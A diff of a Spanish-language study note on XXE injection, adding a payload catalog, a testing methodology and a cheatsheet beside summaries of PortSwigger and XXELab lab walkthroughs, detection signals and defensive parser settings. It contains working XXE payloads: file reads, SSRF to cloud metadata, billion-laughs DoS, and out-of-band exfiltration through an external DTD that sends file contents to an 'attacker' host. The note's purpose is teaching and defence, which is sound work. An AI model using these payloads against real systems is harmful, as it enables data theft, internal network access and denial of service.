@@ -1,15 +1,169 @@
 ---
-aliases: ["XXE Injection", "XML External Entity"]
+aliases: ["XXE Injection", "XML External Entity", "Inyección XXE"]
 tags:
-  - hacking/explotacion
-  - hacking/web
-  - herramientas/burpsuite
-  - linux/filesystem
-  - scripting/bash
-  - hacking/laboratorios
-  - redes/conceptos
-estado: 🟢 Terminado
+  - sec/web
+  - sec/web/xxe
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Server-Side Request Forgery (SSRF)]]"
+  - "[[Local File Inclusion]]"
+  - "[[Ataques de Deserialización]]"
+  - "[[Abuso de Subida de Archivos]]"
+  - "[[Abuso de APIs]]"
+fuente: "https://portswigger.net/web-security/xxe"
 ---
+
+# XML External Entity (XXE) Injection
+
+**XXE Injection** ocurre cuando una aplicación parsea XML **resolviendo entidades externas** y el atacante controla el DOCTYPE: el parser del servidor interpreta `<!ENTITY xxe SYSTEM "file:///etc/passwd">` como una orden de lectura, no como texto. El impacto va desde lectura de archivos locales hasta SSRF, exfiltración out-of-band, DoS (billion laughs) y, en configuraciones concretas, RCE (wrappers como `expect://` en PHP).
+
+> [!info] ¿Qué es XML?
+> XML (*Extensible Markup Language*) es un lenguaje de marcado sin etiquetas predefinidas: la jerarquía de elementos, atributos y texto forma un árbol. Su flexibilidad (DOCTYPE, entidades, referencias externas) es exactamente lo que XXE explota: el parser **resuelve referencias declaradas por el documento**, y si el atacante redacta esas referencias, el parser del servidor obedece.
+
+## Mecánica: entidades, DTD y cómo el parser se dispara
+
+### Anatomía de un documento XML
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>  <!-- prologo -->
+<!DOCTYPE stock [ ... ]>                <!-- declaración de tipo: DTD inline -->
+<stock><productId>1</productId></stock> <!-- elemento raíz + jerarquía de nodos -->
+```
+
+El parser construye un árbol de nodos (elementos, atributos, texto) y, **antes** de devolverlo, resuelve las referencias de entidades declaradas en el DOCTYPE.
+
+### Tipos de entidad
+
+| Tipo | Sintaxis | Resolución | Ejemplo |
+|---|---|---|---|
+| Interna | `<!ENTITY foo "bar">` | Literal, en el propio documento | `&foo;` → `bar` |
+| **Externa** (`SYSTEM`) | `<!ENTITY foo SYSTEM "uri">` | El parser **abre la URI**: `file://`, `http://`, wrappers | `&foo;` → contenido del recurso |
+| Externa (`PUBLIC`) | `<!ENTITY foo PUBLIC "id" "uri">` | Como `SYSTEM` + identificador público | Catálogos DTD |
+| **Parámetro** (`%`) | `<!ENTITY % foo "bar">` | Solo dentro del DTD; se expande con `%foo;` | Cadena OOB |
+| Predefinida | `&amp; &lt; &gt; &quot; &apos;` | Fijas | Escaping |
+
+El **DTD** (*Document Type Definition*) es la lista de reglas y entidades del documento; vive inline (`<!DOCTYPE foo [ ... ]>`) o se referencia externamente (`<!DOCTYPE foo SYSTEM "http://evil/x.dtd">`). **Toda la superficie XXE vive en esa sección**: si controlás el DOCTYPE, controlás qué abre el parser.
+
+### El error del desarrollador
+
+```java
+// ❌ Java: parser por defecto, DTD y entidades externas activas
+DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
+```
+```php
+// ❌ PHP legacy (< libxml 2.9 / sin flags): entidades externas resolubles
+simplexml_load_string($xml);
+```
+```csharp
+// ❌ .NET legacy: XmlDocument con DtdProcessing=Parse y XmlResolver activo
+var doc = new XmlDocument(); doc.LoadXml(input);
+```
+
+## Catálogo de payloads XXE
+
+### 1. Lectura de archivos (in-band: el contenido vuelve en la respuesta)
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><email>&xxe;</email></root>
+```
+
+| Entorno | Recurso |
+|---|---|
+| Linux | `file:///etc/passwd`, `file:///etc/hostname` |
+| Windows | `file:///C:/Windows/win.ini` |
+| PHP (evita romper el parseo) | `php://filter/convert.base64-encode/resource=/etc/passwd` |
+| Java | `file:///etc/passwd` (a veces requiere `netdoc:///`) |
+
+### 2. SSRF / escaneo interno
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+```
+
+Metadata cloud, intranet y servicios localhost — ver [[Server-Side Request Forgery (SSRF)]].
+
+### 3. Blind XXE OOB con entidades de parámetro (exfiltración)
+
+DTD externo alojado por el atacante (`evil.dtd`):
+
+```dtd
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?f=%file;' >">
+%eval;
+%exfil;
+```
+
+Petición víctima:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
+```
+
+Por qué los escapes: `%` dentro de una entidad declarada debe escribirse `&#x25;` (si no, el parser intenta expandir `%exfil;` **antes** de declararlo ⇒ error); igual para `&` → `&#x26;` y `'` → `&#x27;`. El orden importa: primero `%eval;` (declara `exfil`), después `%exfil;` (la usa).
+
+### 4. Blind XXE por mensajes de error
+
+```dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; request SYSTEM 'file:///nonexistent/%file;' >">
+%eval;
+%request;
+```
+
+El error `failed to open '/nonexistent/root:x:0:0:...'` devuelve el contenido en la respuesta.
+
+### 5. Repurposing de DTD local (sin poder servir DTDs externos)
+
+Cargás un DTD del propio sistema que contenga una entidad redefinible (p. ej. `ISOamso` en `/usr/share/yelp/dtd/docbookx.dtd`, presente en GNOME/Yelp) y la redefinís con tu cadena OOB/error-based, anidando las declaraciones dentro de la nueva definición.
+
+### 6. XInclude (cuando el DOCTYPE está bloqueado)
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+### 7. SVG / políglotos (XXE por subida de archivo)
+
+```svg
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+Subilo como avatar y abrí la imagen en otra pestaña: el contenido aparece renderizado. Variantes del mismo vector: XML en `Content-Type: application/xml` enviado a endpoints JSON (basta cambiar el header — ver [[Abuso de APIs]]), docx/xlsx (ZIP con `word/document.xml`), feeds RSS/Atom, envelopes SOAP.
+
+### 8. DoS: Billion Laughs
+
+```xml
+<!DOCTYPE lolz [ <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;...x10"> ... ]><lolz>&lol9;</lolz>
+```
+
+Expansión exponencial de entidades — solo en entornos autorizados.
+
+## Metodología de testing
+
+1. **Localizar parseo XML**: `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; formularios "check stock"; subidas de avatar/feeds; APIs que acepten XML (probar `Accept: application/xml` y cambiar el `Content-Type`).
+2. **Confirmar el parseo**: payload con error de sintaxis — ¿500 o mensaje del parser? Entonces parsea.
+3. **Probar entidad interna** (control total del DOCTYPE): `<!DOCTYPE foo [<!ENTITY myName "stark">]><x>&myName;</x>` reflejado ⇒ entidades activas.
+4. **Sistema de archivos**: `file:///etc/passwd` (Linux) / `file:///C:/Windows/win.ini` (Windows); en PHP encadena `php://filter` base64.
+5. **Si la respuesta no refleja** → blind: primero OOB interaction al Collaborator (`SYSTEM "http://COLLABORATOR"`), luego exfil con DTD externo + entidades de parámetro.
+6. **Si no podés servir DTDs externos** → error-based o repurposing de DTD local.
+7. **Si el DOCTYPE está prohibido** → XInclude / SVG / SOAP / endpoints JSON-XML.
+8. **Escalada**: SSRF a metadata (169.254.169.254), lectura de configs/claves, DoS.
+
+## Conceptos, práctica y laboratorios originales de clase
+
+A continuación se conservan íntegramente las notas originales (XXELab + PortSwigger) con sus capturas:
+
 Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, nos referimos a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.
 
 > [!info] ¿Qué es XML?
@@ -45,7 +199,7 @@ A continuación, se proporciona el enlace al proyecto de Github correspondiente 
 
 -   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
 
-## Notas de la Práctica
+### Notas de práctica — XXELab (material original)
 
 Una vez que tengamos desplegada la máquina, vamos a ver lo siguiente:
 ![[Pasted image 20250825092200.png]]
@@ -184,9 +338,9 @@ Ya con este *script* logramos automatizar esto y ver archivos del sistema:
 
 ![[Pasted image 20250825104304.png]]
 
-## PortSwigger
+#### Laboratorios PortSwigger (notas originales de clase)
 
-### Lab: Exploiting XXE using external entities to retrieve files
+#### Lab: Exploiting XXE using external entities to retrieve files
 
 La vulnerabilidad está en el momento en que se procesa la petición para ver el *stock* de un producto, y si capturamos esta petición, lo que vamos a ver es lo siguiente:
 ![[Pasted image 20250916102548.png]]
@@ -206,7 +360,7 @@ Perfecto, con ayuda del *wrapper* `file` se insertó el contenido de `/etc/passw
 
 Lab Terminado.
 
-### Lab: Exploiting XXE to perform SSRF attacks
+#### Lab: Exploiting XXE to perform SSRF attacks
 
 Al parecer, la máquina está empleando un EC2, el cual no es más que computadoras virtuales donde se ejecutan las aplicaciones.
 
@@ -227,7 +381,7 @@ Perfecto, vemos el contenido de los diferentes archivos.
 ![[Pasted image 20250916113705.png]]
 Lab Terminado.
 
-### Lab: Blind XXE with out-of-band interaction
+#### Lab: Blind XXE with out-of-band interaction
 
 Bueno, en este caso tenemos igual una máquina con una XXE vulnerable, pero a ciegas; no tendremos dónde ver los errores y tampoco los veremos reflejados en ningún lado.
 
@@ -245,7 +399,7 @@ Listo, máquina resuelta.
 ![[Pasted image 20250916115750.png]]
 Lab Completado.
 
-### Lab: Blind XXE with out-of-band interaction via XML parameter entities
+#### Lab: Blind XXE with out-of-band interaction via XML parameter entities
 
 En esta máquina vamos a ver cómo tenemos que usar los parámetros de entidades para poder filtrar la información en casos como este donde no se pueda ver la información.
 
@@ -263,7 +417,7 @@ Perfecto, vemos la petición sin problema.
 ![[Pasted image 20250916124314.png]]
 Con esto, Lab Terminado.
 
-### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+#### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
 
 En este laboratorio se complica un poco y sigue siendo a ciegas, por lo que ahora vamos a tener que filtrar la información.
 
@@ -300,7 +454,7 @@ Perfecto, usamos el contenido para cargar la solución y listo.
 
 Máquina Terminada.
 
-### Lab: Exploiting blind XXE to retrieve data via error messages
+#### Lab: Exploiting blind XXE to retrieve data via error messages
 
 En esta ocasión, lo que vamos a hacer es aprovecharnos de los errores para poder obtener información mediante estos.
 
@@ -324,7 +478,7 @@ Perfecto, ya tenemos la información en el *output*.
 
 Lab Terminado.
 
-### Lab: Exploiting XInclude to retrieve files
+#### Lab: Exploiting XInclude to retrieve files
 
 Este laboratorio contiene un XInclude, el cual es un mecanismo de reconocimiento e inclusión de XML. Cuando se emplea, usualmente no vamos a ver las típicas etiquetas XML, por lo que es una buena idea probar este vector de ataque.
 
@@ -341,7 +495,7 @@ Como podemos observar, no se ven las etiquetas habituales. Por lo tanto, como at
 Esto también es válido cuando no podemos modificar cosas como `DOCTYPE`.
 Con esto debería estar la máquina resuelta.
 
-### Lab: Exploiting XXE via image file upload
+#### Lab: Exploiting XXE via image file upload
 
 En este laboratorio vamos a ver cómo podemos emplear un XXE mediante la subida de un archivo.
 
@@ -362,7 +516,7 @@ Vemos que ya tenemos el contenido del hostname. Con esto vamos a lograr completa
 ![[Pasted image 20250916170916.png]]
 Lab Terminado.
 
-### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
+#### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
 
 En este laboratorio tenemos que cargar el contenido del `/etc/passwd`. Una de las restricciones de este laboratorio es que no podemos cargar DTD de forma externa, como lo hicimos en un laboratorio anterior.
 
@@ -397,3 +551,125 @@ Vamos a comprender el código por completo. Primero, cargamos el documento que c
 Perfecto, vemos que obtenemos en la respuesta el contenido del `/etc/passwd`.
 ![[Pasted image 20250916175644.png]]
 Lab Terminado.
+## Detección
+
+| Señal | Qué indica |
+|---|---|
+| 500 con error de parser al tocar el DOCTYPE | Parser XML activo; posible fixea de sintaxis |
+| Reflejo de valor de entidad interna | Entidades resueltas ⇒ XXE in-band viable |
+| Petición saliente al Collaborator | XXE blind con interacción OOB |
+| Error `failed to open '/nonexistent/<contenido>'` | Error-based blind XXE |
+| Imagen SVG renderizada con texto extraño | XXE por subida de archivo |
+| Latencia alta con DTD externo | Fetch remoto del parser (SSRF) |
+
+## Impacto y riesgo
+
+- **Lectura de archivos** del servidor: `/etc/passwd`, configs, claves privadas (labs: clave del admin vía metadata/SSRF).
+- **SSRF** interno y a cloud metadata — ver [[Server-Side Request Forgery (SSRF)]].
+- **DoS** por expansión de entidades (billion laughs / quadratic blowup).
+- **RCE** en nichos históricos: PHP `expect://`, parsers XML dentro de cadenas de [[Ataques de Deserialización]].
+- **Exfiltración OOB** sin respuesta visible: el dato sale por HTTP desde el propio servidor.
+
+## Defensa (con código)
+
+### 1. Deshabilitar DTDs y entidades en el parser — la defensa real
+
+```java
+// Java
+DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // ✅ mata XXE de raíz
+// Si el DOCTYPE es obligatorio por la app:
+dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+dbf.setXIncludeAware(false);
+dbf.setExpandEntityReferences(false);
+```
+
+```python
+# Python — defusedxml (recomendado)
+from defusedxml import ElementTree as SafeET   # ✅ doctypes/entidades/XInclude desactivados
+# ❌ xml.etree.ElementTree / minidom / pulldown: histórico con XXE activo
+```
+
+```csharp
+// .NET moderno
+var doc = new XmlDocument { XmlResolver = null }; // ✅ sin resolución externa
+// o XDocument.Parse(xml) / XmlReader con DtdProcessing = DtdProcessing.Prohibit
+```
+
+```go
+// Go: encoding/xml no resuelve entidades externas por defecto — mantenerlo así
+// ❌ no usar librerías que añadan un EntityReader custom con entidades externas
+```
+
+> [!warning] `libxml_disable_entity_loader` es una trampa
+> Desde PHP 8.0 la función está obsoleta porque libxml ≥ 2.9 ya no resuelve entidades externas por defecto. Llamarla **no protege** contra XInclude ni contra DTDs internos con expansión; la defensa correcta es **no** pasar `LIBXML_NOENT`, usar `LIBXML_NONET` y validar/esquemas sin DOCTYPE. En PHP legacy la llamada ayudaba, pero dependía de que nadie reactivara la resolución con flags.
+
+```php
+// PHP correcto (libxml moderno)
+$doc = simplexml_load_string($xml, "SimpleXMLElement", LIBXML_NONET); // ✅ sin red
+//❌ simplexml_load_string($xml, ..., LIBXML_NOENT);                  // reactiva entidades
+```
+
+### 2. Sanitizar/servir XML sin DOCTYPE y con schema
+
+- Regla WAF/app: rechazar bodies XML que contengan `<!DOCTYPE`, `<!ENTITY`, `SYSTEM` o `XInclude`.
+- Validar contra XSD en modo "no network"; tratar SVG/XML subido como binario peligroso (ver [[Abuso de Subida de Archivos]]): servir con `Content-Disposition`, sin ejecución y en dominio separado.
+
+### 3. Salida de red restringida (mitiga OOB/SSRF)
+
+Allowlist de destinos salientes del servicio XML, o sinkhole de `file://` y del endpoint de metadata cloud: defensa en profundidad si algo se cuela.
+
+## Errores comunes
+
+**Atacante:**
+1. Probar solo `file:///etc/passwd` en un backend Windows (`file:///C:/Windows/win.ini`).
+2. Dejar `%exfil;` sin escapar (`&#x25;`) — el parser falla al expandir la declaración.
+3. Esperar la respuesta del OOB: el blind XXE no devuelve nada; revisá el Collaborator, no la respuesta.
+4. Olvidar los `&` de la referencia (`&xxe;` vs `xxe;`) o declarar `%request;` antes de `%eval;`.
+5. Subir el SVG pero no verificar que el servidor lo parsea al mostrarlo.
+
+**Defensor:**
+1. "Actualizamos libxml/PHP": correcto pero insuficiente — XInclude, SOAP y parsers de terceros siguen expuestos.
+2. Pasar `LIBXML_NOENT` "para que expanda" y reactivar XXE.
+3. Bloquear solo `file://` y dejar `http://` (SSRF intacto).
+4. Dejar el parser legacy de .NET (`DtdProcessing=Parse`) por compatibilidad.
+
+## Cheatsheet
+
+```xml
+<!-- In-band: lectura de archivos -->
+<!DOCTYPE f [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><r><a>&xxe;</a></r>
+<!-- PHP en base64 -->
+<!DOCTYPE f [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+<!-- SSRF -->
+<!DOCTYPE f [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+<!-- OOB: DTD externo (evil.dtd alojado por el atacante) -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://A/?f=%file;' >">%eval;%exfil;
+<!-- Petición que carga el DTD externo -->
+<!DOCTYPE f [ <!ENTITY % dtd SYSTEM "http://A/evil.dtd"> %dtd; ]>
+<!-- Error-based -->
+<!ENTITY % eval "<!ENTITY &#x25; r SYSTEM 'file:///no/%file;' >">
+<!-- XInclude (DOCTYPE bloqueado) -->
+<f xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></f>
+<!-- Confirmación: entidad interna reflejada -->
+<!DOCTYPE f [ <!ENTITY myName "stark"> ]><r><a>&myName;</a></r>
+```
+
+## Laboratorios y referencias
+
+- PortSwigger Academy — XXE: https://portswigger.net/web-security/xxe
+- OWASP — XML External Entity Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+- PayloadsAllTheThings — XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+- XXELab (docker de la clase): https://github.com/jbarone/xxelab
+- defusedxml (Python): https://pypi.org/project/defusedxml/
+
+## Relacionadas
+
+- [[Server-Side Request Forgery (SSRF)]] — el SSRF vía `SYSTEM`/entidades externas
+- [[Local File Inclusion]] — el mismo impacto de lectura de archivos por otro camino
+- [[Ataques de Deserialización]] — parsers "fantasma" que procesan XML dentro de cadenas de ataque
+- [[Abuso de Subida de Archivos]] — XXE por SVG y políglotos subidos
+- [[Abuso de APIs]] — endpoints JSON que aceptan XML cambiando el `Content-Type`
